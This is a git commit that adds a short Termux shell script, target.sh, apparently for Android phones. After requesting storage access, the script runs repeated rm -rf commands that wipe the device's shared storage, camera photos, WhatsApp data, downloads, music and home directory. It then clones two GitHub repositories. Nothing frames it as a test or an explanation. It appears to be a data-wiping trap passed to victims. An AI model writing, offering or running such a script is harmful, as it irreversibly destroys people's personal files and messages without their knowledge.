58448bd9df05610664bc4f253876e826a65c1520
MltrCyber <52839806+MltrCyber@users.noreply.github.com>
2019-10-16 06:00:09 +0700

    Add files via upload

---
+++ target.sh
@@ -0,0 +1,17 @@
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/DCIM
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/WhatsApp
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/Downloads
+rm -rf /storage/emulated/0/Music
+rm -rf /sdcard/0/Music
+cd /sdcard
+git clone https://github.com/rikosanjuri14/Picture
+git clone https://github.com/rikosanjuri14/Noruku
